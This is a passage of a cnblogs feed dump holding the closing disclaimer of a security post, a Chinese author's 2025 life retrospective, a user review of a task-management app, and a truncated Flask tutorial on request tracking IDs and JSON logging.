/>\n<strong>严禁</strong>在未获得明确授权的情况下，对任何系统进行测试或攻击。任何不当使用所导致的法律责任及后果，均由使用者自行承担。<br />\n作者与文档提供者不承担任何因滥用本文档信息而产生的直接或间接责任。请遵守您所在地的法律法规，并始终践行负责任的网络安全实践。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n\t\t<p class=\"postfoot\">\n\t\t\tposted on \n<span id=\"post-date\">2026-01-16 16:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/hzhsec\">hzhsec</a>&nbsp;\n阅读(<span id=\"post_view_count\">33</span>)&nbsp;\n评论(<span id=\"post_comment_count\">2</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n\t\t</p>"
    },
    {
      "title": "我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海",
      "link": "https://www.cnblogs.com/HaiJun-Aion/p/19492492",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/HaiJun-Aion/p/19492492\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 15:50\">\n    <span>我的2025：做项目、跑副业、见人、奔波、搬家、维权、再回上海</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>2025 年，如果让我用一句话定性，我会说：<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>这一年我做了很多事，多到我一度不敢回头看。表面上看，我一直在“往前”：写内容、做项目、跑副业、见人、奔波、搬家、维权、再回上海。可只有我自己知道，真正折磨人的不是忙，是那种反复出现的瞬间——我突然意识到：我不是在冲，我是在<strong>被生活推着跑</strong>。</p>\n<p>我确实拿到了一些结果。内容有过爆的时刻，小红书涨了粉，视频剪辑从手忙脚乱到慢慢顺手，有人开始来问我、信我、甚至愿意付费。那段时间我有一种很罕见的笃定：只要我肯学、肯磨，很多事我都能做成。那种“我好像什么都能做”的自信，在这一年里反复把我从低谷里托起来。</p>\n<p>但同样是这一年，我也交了一笔不轻的学费。不是钱那么简单，更是对人、对机会、对“看起来很美”的承诺的那种天真。我曾因为信任做了一个很重的决定；也曾在北京的夜里把事情一条条摊开算清楚，最后发现不是值不值的问题，而是我再拖下去，就会把自己耗到没样子。</p>\n<p>我不想把这篇复盘写成流水账，也不想写成鸡汤。我只想把这一年最真实的部分摆出来：我怎么一点点变强，怎么被现实教育，怎么止损、怎么维权、怎么把自己从废墟里捡回来。</p>\n<hr />\n<h2 id=\"1-我开始把表达当成一件正事\">1. 我开始把表达当成一件正事</h2>\n<p>三月开始，我把很多注意力放在“说清楚”这件事上。</p>\n<p>以前我也输出，但更多像随手记录。2025 年不一样，我开始认真经营表达：每天钻研、每天尝试、每天复盘。公众号有了更明确的正反馈，有几篇文章突然被推起来，评论区开始出现陌生人的共鸣，后台也开始有人来问我问题。那种感觉很奇妙——我写的东西不再只属于我自己，它开始进入别人的生活。</p>\n<p><strong>今年使用最多的AI IDE 就是Trae，也参加了第一期的Trae 征文活动，获得了第二名，Trae给我来了很多成长。</strong></p>\n<h3 id=\"今年在trae-方面的实践\">今年在Trae 方面的实践：</h3>\n<ol>\n<li><a href=\"https://juejin.cn/post/7462542925915848744\" rel=\"noopener nofollow\" target=\"_blank\">字节跳动推出AI编程神器Trae，基于Trae 从 0 开发一个Google 插件！</a><br />\n<img alt=\"image\" class=\"lazyload\" /></li>\n</ol>\n <hr /> \n<hr /> \n<p>2.<a href=\"https://github.com/TickHaiJun/Dompet-App-React-Native\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 开发的第一个APP</a></p>\n<p>Trae 刚出来Claude模型时，连夜测评它的能力，当时花了5个小时搞出一个App，项目并且还开源了<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<ol start=\"3\">\n<li><a href=\"https://github.com/TickHaiJun/Podcast\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae 设计的原型稿</a></li>\n</ol>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我也开始碰视频。说实话，一开始很狼狈：剪一个一分钟的视频，要花我两三个小时。卡点、配乐、字幕、节奏，哪一样都不像看起来那么简单。我一度怀疑是不是我不适合，但又不甘心。我知道这是一块我之前没尝试过的能力，一旦练出来，就是新的路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1VHQLYvE6C/?vd_source=824b78ff76f90d1fc4e5e732bb09b3c1\" rel=\"noopener nofollow\" target=\"_blank\">基于Trae还做了原型还原设计稿，没想到视频火了</a><br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<hr /> \n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这一段给我的礼物，是一种更稳定的自信：很多事看起来复杂，只要拆开、一步步做，就会变得可控。</p>\n<hr />\n<h2 id=\"2-我把想法做成了作品通过vibe-coding\">2. 我把想法做成了作品通过Vibe Coding</h2>\n<p>五月到八月，我进入了一种“手里有活”的状态。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2ODI4OTMwMw==&amp;mid=2247492557&amp;idx=1&amp;sn=8949270a3c3bf6f409d6e6046cb8411a&amp;scene=21#wechat_redirect\" rel=\"noopener nofollow\" target=\"_blank\">从懵懂到落地：记录我们第一次成功将大模型“塞”进业务的曲折历程</a></p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>年初做了自己第一款AI应用</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那段时间我做了很多作品，也开源了不少东西。说白了，就是把想法从脑子里拎出来，做成一个能跑、能看、能用、能被别人理解的东西。</p>\n<p>与此同时，我也给团队做了多次分享，讲我最近在做什么、怎么做、踩了什么坑、怎么绕开。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>中间有两次机会我印象很深：一次是来自一家很大的咨询公司，一次是出海方向的远程邀请。它们都挺诱人，但我当时都拒绝了。原因很简单：我知道我还没准备好。能力没到那个厚度、心态没到那个稳定度，我不想靠运气上去，然后靠硬扛撑住。</p>\n<p>也有一些小小的惊喜：有人买了我做的东西，虽然数量不算多，但足够让我确认——我做的东西不是自嗨，是真的有人需要。更重要的是，越来越多的网友通过我的内容认识我，联系我，问我问题。</p>\n<p>那几个月我最大的收获不是“做了多少”，而是一个更朴素的结论：<strong>想法不值钱，做出来才值钱。</strong></p>\n<hr />\n<h2 id=\"3-有人愿意为我的能力买单\">3. 有人愿意为我的能力买单</h2>\n<p>九月到十一月，我的副业开始像一门“正经事”。</p>\n<p>咨询变多了。有的是临时问答，有的是更系统的陪跑。我接了三份陪跑，也因此认识了几位很投缘的朋友，都是山西的。我们聊项目、聊选择、聊怎么把事情做成，也聊怎么在现实里不把自己弄丢。</p>\n<p>这份关系很珍贵。它不是那种互相吹捧的热闹，而是我能明显感到：对方因为我的建议少走了弯路，事情推进得更顺，而我也因为对方的反馈变得更坚定。那种“我真的帮到了人”的成就感，比数字更实在。</p>\n<p>我也在这一段第一次更清晰地看到我的位置：我不是只能埋头做项目的人，我还可以把经验讲清楚，把复杂拆简单，把别人卡住的点指出来。这是一种能力，也是一种责任感。</p>\n<p>这一段让我相信：靠自己攒出来的口碑，慢，但稳。</p>\n<hr />\n<h2 id=\"4-我重新确认了钱该花在哪\">4. 我重新确认了“钱该花在哪”</h2>\n<p>国庆我和家人自驾出去玩了一趟。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>风很大，天很高，羊肉很香。我们在草原上待了一天，我给父母安排了越野卡丁车，让他们在草地上跑一圈；我和姐姐骑了马，笑得像回到小时候。那几天我很放松，甚至有点恍惚——原来我努力这么久，最想换来的并不是某个头衔，而是这种“我能让他们开心”的底气。</p>\n<p>我以前对花钱很谨慎，总觉得要攒着、要算计回报。可当我把钱花在家人身上，那种舒坦很直接：不需要证明，不需要解释，花出去就是一种“我扛得住了”的确认。</p>\n<hr />\n<h2 id=\"5-去北京一趟我把胆子捡了回来\">5. 去北京一趟，我把胆子捡了回来</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十月我去北京参加了一个活动，也算第一次为了这类事出远门。2026年，多输出AI，多参加活动。</p>\n<p>现场人很多，节奏很快，信息密得让人喘不过气。那天我最大的感受，不是见了什么产品，而是突然明白：机会真的会从我身边走过去，走过去就没了。很多时候不是我不够好，是我不敢站出来，或者我下意识觉得“我还不够格”。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>去天津路上，熟悉的感觉</p>\n<p>我也去了天津，见了老朋友老李。我们聊了一整天，我帮他搬运整理食品，他带我吃了天津菜，甚至让我体验了一把保时捷 911。最后他把我送到机场。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一天让我很感慨：这个世界其实很大，也很活，我不能总把自己困在“怕麻烦、怕尴尬、怕出丑”的情绪里。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>今年我也买了不少书，也读了不少书。《亲密关系》《认知驱动》《纳瓦尔宝典》……它们没有给我标准答案，但给了我更清醒的视角：我要对自己的情绪负责，对自己的选择负责，对自己的长期负责。</p>\n<hr />\n<h2 id=\"6-我相信过他也因此完成了一次祛魅\">6. 我相信过他，也因此完成了一次祛魅</h2>\n<p>十一月底，我做了一个很重的决定：离职，去北京试一次。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>这件事我并不是冲动。相反，我想了将近一个月。朋友“他”邀请过我三次，前两次我都拒绝了。第三次创始人亲自找我，话说得很漂亮，未来画得很大，而我也确实在那个阶段渴望一次更大的空间。再加上对“他”的信任，我最终点了头。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>离开前，我做了一件我很想做的事：把爸爸接到上海。那是他第一次来上海，也是他第一次坐飞机。我去接他的时候，他脸上的喜悦藏不住。我带他逛了很多地方，拍了很多照片。送他去机场那天，我心里很踏实——那种成就感，不来自任何评价，只来自“我能带他看世界”的瞬间。</p>\n<p>今年我也给妈妈买了新手机，她之前那部太卡了。再小的事情，落在父母身上都是实在的改变。</p>\n<p>然后我去了北京。</p>\n<p>现实很快给了我一记闷棍。之前说的和实际差太多太多。我会在很短时间内发现：有些话只是话，有些承诺只是情绪，有些“格局”只是包装。我不想在这里写具体细节，但我可以写结论——这次经历让我完成了一次祛魅：对人、对所谓“机会”、对“看起来很美”的未来。</p>\n<p>我也更清楚了一件事：我并不是不能吃苦，我是不愿意把我的尊严和时间押在不靠谱的人和不靠谱的事上。</p>\n<hr />\n<h2 id=\"7-我救了三只狗也被这座城市的善意接住\">7. 我救了三只狗，也被这座城市的善意接住</h2>\n<p>这一年我救了三只狗。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第一只是中华田园犬，在公园遇到的。它很瘦，眼神怯，但又不躲人。</p>\n<p>第二只是边牧，在公司附近，它更像是走丢的孩子，聪明又无助。<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>第三只是阿拉斯加，在豫园附近，体型很大，却一点安全感都没有。</p>\n<p>我喜欢狗。遇见它们的时候，我很难装作没看见。我做的事其实也不复杂：拍照、发帖、联系、筛选领养人、把信息对齐清楚，然后送它们去新家。</p>\n<p>这件事最打动我的，不是我多善良，而是我发现：大城市真的有很多愿意伸手的人。我发出求助，真的会有人回应。我以为我在救它们，其实在某些时刻，是这些善意在把我从疲惫里接住。</p>\n<hr />\n<h2 id=\"8-一笔沉没成本止损维权和不再委屈自己\">8. 一笔沉没成本：止损、维权、和不再委屈自己</h2>\n<p>十二月初，北京给了我最硬的一课。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我在北京待了十来天，一直住酒店。对方之前说会报销，但后来什么都没有。入职前一天我找了房子，租房费用、中介费用、再加上各种奔波成本，堆起来是一笔不小的支出。更糟的是：入职第一天我就通过另一位同样处境的人了解到了真实情况；再加上“他”下班后说的一些话，我很快确定——这里不是我该待的地方。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>那一刻最难的其实不是离开，而是面对沉没成本。我已经付出那么多，我会本能地想“再忍忍，再等等”。但我很庆幸，那天我没骗自己。我选择止损。</p>\n<p>随之而来的就是维权。房子我没入住，合同日期也没开始，但管家很无赖，甚至带着恐吓。那种“我讲理他就耍赖”的感觉很恶心。我一开始也很烦，后来干脆不和她废话，直接走流程，通过 12315 协调，拿回了一部分。理论上可以拿回更多，但要继续耗时间精力，我当时选择到此为止。</p>\n<p>这一段时间，让家里也没少操心，哎....</p>\n<p>我最想写给自己的不是“钱亏了”，而是一个更重要的结论：<strong>以后遇到不公，我不再用委屈换和平。该维权就维权，该翻脸就翻脸。</strong></p>\n<hr />\n<h2 id=\"9-回到上海我把自己一点点拉回正轨\">9. 回到上海：我把自己一点点拉回正轨</h2>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>十二月中旬我回到了上海。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>收拾好家里的工位</p>\n<p>那段时间我能量很低。不是累，是一种被现实撞过之后的钝。我会怀疑自己、怀疑判断、怀疑信任，甚至怀疑“是不是我太敏感了”。但生活不会等我缓过来，它只会继续往前。</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<p>我做的第一件事是把我自己拉回正常：吃饭、睡觉、见朋友。后来我和老耿去了杭州散心。城市很安静，走在路上我突然发现：风还是一样吹，灯还是一样亮，我不会因为受挫就失去明天。</p>\n<p>我慢慢控住场了。把生活拉回正轨了。也把那句最重要的话重新捡回来——<strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<hr />\n<h2 id=\"最后\">最后</h2>\n<p>回头看 2025 年，我最大的变化不是“我做了多少”，而是<strong>我对人生结构的要求变高了</strong>。</p>\n<p>以前我会把努力当成答案。现在我更在意：这份努力能不能沉淀，能不能让我拥有更多选择权。以前我遇到烂事会先忍，想着“算了”。但北京那一段之后我更确定：委屈不会换来尊重，只会换来下一次更大的代价。该止损就止损，该维权就维权——哪怕沉没成本已经砸下去，我也要把自己从泥里拎出来。</p>\n<p>这一年我也完成了一次祛魅：<br />\n对“机会”的祛魅，对“关系”的祛魅，对“画出来的未来”的祛魅。<br />\n我开始相信一句话：<strong>真正值得的机会，不会只靠嘴说；真正可靠的人，也不会只靠情绪绑架。</strong></p>\n<p>如果说 2025 年教会了我什么，我觉得是三件事：</p>\n<p>第一，能力不是拿来逞强的，是拿来兜底的。<br />\n我在最狼狈的时候，靠自己把局面稳住了。那种“我能扛住”的底气，是真的。</p>\n<p>第二，钱花在家人身上，会变成一种很踏实的成就感。<br />\n我以前以为成就感来自外界认可，今年我更确定：来自父母的笑、来自家人的安心、来自“我可以照顾他们”。</p>\n<p>第三，善意是会流动的。<br />\n我帮过人，也被人帮过；我救过狗，也被陌生人的热心治愈过。世界不全是烂人，但我得学会识别，学会筛选，学会保护自己。</p>\n<p>2026 年我不想再喊口号了。我只想做三件更具体的事：</p>\n<ul>\n<li><strong>把一条能长期跑的主线做出来</strong>：让输出、作品和服务真正形成稳定的节奏，而不是靠运气起伏。</li>\n<li><strong>给信任立规矩</strong>：合作要有边界，承诺要能落地，任何决定都要留后手。</li>\n<li><strong>把家放进计划里</strong>：不是“有空再说”，而是本来就该排在前面。</li>\n</ul>\n<p>2025 年没有把我推到高处，但它把我从幻觉里拽出来了。<br />\n我依然会往前走，只是以后我更在乎的不是速度，而是方向；不是热闹，而是结构。</p>\n<p><strong>我在变强，也在重新选择自己的人生结构。</strong></p>\n<p>希望2026年一切顺利!</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-16 15:50</span>&nbsp;\n<a href=\"https://www.cnblogs.com/HaiJun-Aion\">程序员海军</a>&nbsp;\n阅读(<span id=\"post_view_count\">238</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "终于找到了一款足够简单的任务管理软件",
      "link": "https://www.cnblogs.com/lbnnbs/p/19491338",
      "published": "",
      "description": "<div class=\"postTitle\">\n            <h1><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lbnnbs/p/19491338\" id=\"cb_post_title_url\" title=\"发布于 2026-01-16 12:23\">\n    <span>终于找到了一款足够简单的任务管理软件</span>\n    \n\n</a>\n</h1>\n        </div>\n        <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n现在大家不但休息时间很碎片化，工作时间很多时候都是碎片化的。为了管理好自己的工作，我各类软件都使用过。但市面上多数工具要么功能繁杂，要么不支持手机版，要不就是收费太贵，真不是我这样的小白能用的起的。我个人使用过使用过很多的工作任务管理软件，有项目管理类的，有便签类的，有日程类的。但项目管理类的操作过于复杂，日程类和便签类的又没有团队协作功能。总之很难找一款简单好用的小团队小项目任务管理软件。后来百度的时候搜索到了一款叫九运任务宝的小工具，它官网上强调以 “简单、轻快、好用” 为核心定位，感觉有点点靠谱。下载试用后感觉还真不错，最起码要的东西都有。现在经过了几个月的使用，感觉找到了梦中情软（说的过分了点^_^）。<br /><br />传统任务管理软件，创建一个任务需要经历填写名称、设置分类、选择成员、调整时间等多个繁琐步骤，甚至需要跳转多个页面才能完成配置，新手入门需要花不少时间去学习，特别是项目管理类的，特别复杂。不但没有帮到工作排期，反而给增加了额外负担。而且有些工具的任务编辑功能简陋，缺少撤销重做，手机上操作一不小心删除时删过了头，就要重写一大段了。但这个九运任务宝任务创建全流程都和简单，只需专注填写任务内容，会自动根据首段内容智能生成任务名称，不用反复斟酌标题，秒速完成任务记录。任务内容编辑框带了撤销和重做功能，操作失误要不怕。<br /><br />他还有一个上传的图片会自动标注序号的功能，可以和任务内容上的描述匹配起来，让任务要求更清晰。这种 “少操作、多专注” 的设计，让任务创建效率提高不少。<br /><br />传统任务管理软件常常追求 “大而全”，堆砌了大量使用率极低的复杂功能，不仅增加了软件体积和操作难度，还容易让我在众多功能面前一脸懵逼。<br /><br />比如吧，项目管理类软件权限管理模块设计太复杂，设置流程繁琐。在比如大多数工具的任务状态没有 “搁置” 等选项，暂时无需处理的任务只能占用列表空间，导致信息杂乱。<br /><br />但这个九运任务宝在任务设置上，有“已搁置” 这个任务状态，就很方便，任务列表更整洁。在时间选择界面用绿色加粗字体标注节假日，工作排期时不需要额外切换日历APP查询假期。批量操作功能简单直观，长按任务即就可以进入批量编辑模式，右滑操作也很人性化，搞得我不时就像去划一下。此外，任务分类、优先级设置、协作人指派、甘特图等核心功能一应俱全，既满足多场景需求，又没啥多余的操作。<br /><br />另外，大多拥有项目和任务管理的软件移动端都比较难用，外出时宅手机上处理任务很头疼。这个九运任务宝就支持 PC 电脑端、手机 APP 端、微信小程序端、手机 H5 网页端，在外面也能随时随地操作。<br /><br />感觉现在的软件都越做越复杂，不实用的功能一大堆，追求大而全，像这类关注核心需要的软件倒是更少，也不知道是咋回事，是不知道我们需要什么样的工具才顺手吗。\n</div>\n<div class=\"clear\"></div>\n\n        <div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-16 12:23</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lbnnbs\">lbnnbs</a>&nbsp;\n阅读(<span id=\"post_view_count\">530</span>)&nbsp;\n评论(<span id=\"post_comment_count\">4</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "[python]Flask - Tracking ID的设计",
      "link": "https://www.cnblogs.com/XY-Heruo/p/19496753",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/XY-Heruo/p/19496753\" id=\"cb_post_title_url\" title=\"发布于 2026-01-17 17:22\">\n    <span>[python]Flask - Tracking ID的设计</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        本文详细介绍如何在 Flask 应用中实现请求跟踪 ID (tracking_id) 功能，包括中间件设计、日志记录、响应格式化等完整方案，帮助开发者实现请求链路追踪，提升系统可观测性。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"前言\">前言</h2>\n<p>在实际业务中，根据 <code>tracking_id</code> 追溯一条请求的完整处理路径是比较常见的需求。借助 Flask 自带的全局对象 <code>g</code> 以及钩子函数，可以很容易地为每条请求添加 <code>tracking_id</code>，并在日志中自动记录。</p>\n<p>主要内容：</p>\n<ul>\n<li>如何为每条请求添加 <code>tracking_id</code></li>\n<li>如何为日志自动添加 <code>tracking_id</code> 记录</li>\n<li>如何自定义响应类，实现统一的响应格式，并在响应头中添加 <code>tracking_id</code></li>\n<li>视图函数单元测试示例</li>\n<li>Gunicorn 配置</li>\n</ul>\n<h2 id=\"项目结构\">项目结构</h2>\n<p>虽然内容看起来很多，但 tracking_id 的实现其实很简单。本文按照生产项目的规范组织了代码，添加了 Gunicorn 配置和单元测试代码，以及规范了日志格式和 JSON 响应格式。</p>\n<pre><code>├── apis\n│   ├── common\n│   │   ├── common.py\n│   │   └── __init__.py\n│   └── __init__.py\n├── gunicorn.conf.py\n├── handles\n│   └── user.py\n├── logs\n│   ├── access.log\n│   └── error.log\n├── main.py\n├── middlewares\n│   ├── __init__.py\n│   └── tracking_id.py\n├── pkgs\n│   └── log\n│       ├── app_log.py\n│       └── __init__.py\n├── pyproject.toml\n├── pytest.ini\n├── README.md\n├── responses\n│   ├── __init__.py\n│   └── json_response.py\n├── tests\n│   └── apis\n│       └── test_common.py\n├── tmp\n│   └── gunicorn.pid\n└── uv.lock\n</code></pre>\n<p>安装依赖</p>\n<pre><code class=\"language-shell\">uv add flask\nuv add gunicorn gevent  # 生产环境部署一般依赖这两个\nuv add --dev pytest           # 测试库\n</code></pre>\n<h2 id=\"实现添加-tracking_id-的中间件\">实现添加 tracking_id 的中间件</h2>\n<p>代码文件：<code>middlewares/tracking_id.py</code></p>\n<pre><code class=\"language-python\">from uuid import uuid4\n\nfrom flask import Flask, Response, g, request\n\n\ndef tracking_id_middleware(app: Flask):\n    \"\"\"\n    跟踪 ID 中间件\n    为每个请求生成或获取跟踪 ID，用于追踪请求链路\n    \"\"\"\n    \n    @app.before_request\n    def tracking_id_before_request():\n        \"\"\"\n        请求前处理函数\n        检查请求头中是否包含 X-Tracking-ID，如果没有则生成一个新的 UUID 作为跟踪 ID\n        并将其存储到 Flask 的全局对象 g 中，供后续处理使用\n        \"\"\"\n        # 从请求头中获取 X-Tracking-ID\n        tracking_id = request.headers.get(\"X-Tracking-ID\")\n        if not tracking_id:\n            # 如果请求头中没有 X-Tracking-ID，则生成一个新的 UUID\n            tracking_id = str(uuid4())\n        # 将跟踪 ID 存储到 Flask 的全局对象 g 中，供后续处理使用\n        g.tracking_id = tracking_id\n\n    @app.after_request\n    def tracking_id_after_request(response: Response):\n        \"\"\"\n        请求后处理函数\n        将跟踪 ID 添加到响应头中，以便客户端知道本次请求的跟踪 ID\n        \"\"\"\n        # 检查响应头中是否已经有 X-Tracking-ID\n        tracking_id = response.headers.get(\"X-Tracking-ID\", \"\")\n        if not tracking_id:\n            # 如果响应头中没有 X-Tracking-ID，则从全局对象 g 中获取\n            tracking_id = g.get(\"tracking_id\", \"\")\n            # 将跟踪 ID 添加到响应头中\n            response.headers[\"X-Tracking-ID\"] = tracking_id\n        return response\n\n    # 返回应用实例\n    return app\n</code></pre>\n<p>代码文件 <code>middlewares/__init__.py</code>，方便其他模块导入</p>\n<pre><code class=\"language-python\">from .tracking_id import tracking_id_middleware\n\n__all__ = [\n    \"tracking_id_middleware\",\n]\n</code></pre>\n<h2 id=\"日志模块---自动记录-tracking_id\">日志模块 - 自动记录 tracking_id</h2>\n<p>实现一个简单的输出到控制台的日志模块，日志格式为 JSON，自动添加 tracking_id 到日志中，避免手动在 <code>logger.info()</code> 这类方法中传入 <code>tracking_id</code>。</p>\n<p>代码文件 <code>pkgs/log/app_log.py</code></p>\n<pre><code class=\"language-python\">import json\nimport logging\nimport sys\n\nfrom flask import g\n\n\nclass JSONFormatter(logging.Formatter):\n    \"\"\"日志格式化器，输出 JSON 格式的日志。\"\"\"\n\n    def format(self, record: logging.LogRecord) -&gt; str:\n        log_record = {\n            \"@timestamp\": self.formatTime(record, \"%Y-%m-%dT%H:%M:%S%z\"),\n            \"level\": record.levelname,\n            \"name\": record.name,\n            # \"processName\": record.processName,  # 如需记录进程名可取消注释\n            \"tracking_id\": getattr(record, \"tracking_id\", None),\n            \"loc\": \"%s:%d\" % (record.filename, record.lineno),\n            \"func\": record.funcName,\n            \"message\": record.getMessage(),\n        }\n\n        return json.dumps(log_record, ensure_ascii=False, default=str)\n\n\nclass TrackingIDFilter(logging.Filter):\n    \"\"\"日志过滤器，为日志记录添加 tracking_id。\"\"\"\n\n    def filter(self, record):\n        record.tracking_id = g.get(\"tracking_id\", None)\n        return True\n\n\ndef _setup_console_handler(level: int) -&gt; logging.StreamHandler:\n    \"\"\"设置控制台日志处理器。\n\n    Args:\n        level (int): 日志级别。\n    \"\"\"\n    handler = logging.StreamHandler(sys.stdout)\n    handler.setLevel(level)\n    handler.setFormatter(JSONFormatter())\n    return handler\n\n\ndef setup_app_logger(level: int = logging.INFO, name: str = \"app\") -&gt; logging.Logger:\n    logger = logging.getLogger(name)\n\n    if logger.hasHandlers():\n        return logger\n\n    logger.setLevel(level)\n    logger.propagate = False\n\n    logger.addHandler(_setup_console_handler(level))\n    logger.addFilter(TrackingIDFilter())\n\n    return logger\n</code></pre>\n<p>在 <code>pkgs/log/__init__.py</code> 中初始化 <code>logger</code>，实现单例调用。</p>\n<pre><code class=\"language-python\">from .app_log import setup_app_logger\n\nlogger = setup_app_logger()\n\n__all__ = [\"logger\"]\n</code></pre>\n<h2 id=\"自定义响应类\">自定义响应类</h2>\n<p>规范 JSON 类型的响应格式，并在响应头中添加 <code>X-Tracking-ID</code> 和 <code>X-DateTime</code>。</p>\n<p>代码文件 <code>responses/json_response.py</code></p>\n<pre><code class=\"language-python\">import json\nfrom datetime import datetime\nfrom http import HTTPStatus\nfrom typing import Any\n\nfrom flask import Response, g, request\n\n\nclass JsonResponse(Response):\n    def __init__(\n        self,\n        data: Any = None,\n        code: HTTPStatus = HTTPStatus.OK,\n        msg: str = \"this is a json response\",\n    ):\n        x_tracking_id = g.get(\"tracking_id\", \"\")\n        x_datetime = datetime.now().astimezone().isoformat(timespec=\"seconds\")\n        resp_headers = {\n            \"Content-Type\": \"application/json\",\n            \"X-Tracking-ID\": x_tracking_id,\n            \"X-DateTime\": x_datetime,\n        }\n        try:\n            resp = json.dumps(\n                {\n                    \"code\": code.value,\n                    \"msg\": msg,\n                    \"data\": data,\n                },\n                ensure_ascii=False,\n                default=str,\n            )\n        except Exception as e:\n            resp = json.dumps(\n                {\n                    \"code\": HTTPStatus.INTERNAL_SERVER_ERROR.value,\n                    \"msg\": f\"Response serialization error: {str(e)}\",\n                    \"data\": None,\n                }\n            )\n        super().__init__(response=resp, status=code.value, headers=resp_headers)\n\n\nclass Success(JsonResponse):\n    def __init__(self, data: Any = None, msg: str = \"\"):\n        if not msg:\n            msg = f\"{request.method} {request.path} success\"\n        super().__init__(data=data, code=HTTPStatus.OK, msg=msg)\n\n\nclass Fail(JsonResponse):\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} failed\"\n        super().__init__(data=data, code=HTTPStatus.INTERNAL_SERVER_ERROR, msg=msg)\n\n\nclass ArgumentNotFound(JsonResponse):\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} argument not found\"\n        super().__init__(data=data, code=HTTPStatus.BAD_REQUEST, msg=msg)\n\n\nclass ArgumentInvalid(JsonResponse):\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} argument invalid\"\n        super().__init__(data=data, code=HTTPStatus.BAD_REQUEST, msg=msg)\n\n\nclass AuthFailed(JsonResponse):\n    \"\"\"HTTP 状态码: 401\"\"\"\n\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} auth failed\"\n        super().__init__(data=data, code=HTTPStatus.UNAUTHORIZED, msg=msg)\n\n\nclass ResourceConflict(JsonResponse):\n    \"\"\"HTTP 状态码: 409\"\"\"\n\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} resource conflict\"\n        super().__init__(data=data, code=HTTPStatus.CONFLICT, msg=msg)\n\n\nclass ResourceNotFound(JsonResponse):\n    \"\"\"HTTP 状态码: 404\"\"\"\n\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} resource not found\"\n        super().__init__(data=data, code=HTTPStatus.NOT_FOUND, msg=msg)\n\n\nclass ResourceForbidden(JsonResponse):\n    \"\"\"HTTP 状态码: 403\"\"\"\n\n    def __init__(self, msg: str = \"\", data: Any = None):\n        if not msg:\n            msg = f\"{request.method} {request.path} resource forbidden\"\n        super().__init__(data=data, code=HTTPStatus.FORBIDDEN, msg=msg)\n\n</code></pre>\n<p>代码文件 <code>responses/__init__.py</code>，方便其他模块调用。</p>\n<pre><code class=\"language-python\">from .json_response import (\n    ArgumentInvalid,\n    ArgumentNotFound,\n    AuthFailed,\n    Fail,\n    JsonResponse,\n    ResourceConflict,\n    ResourceForbidden,\n    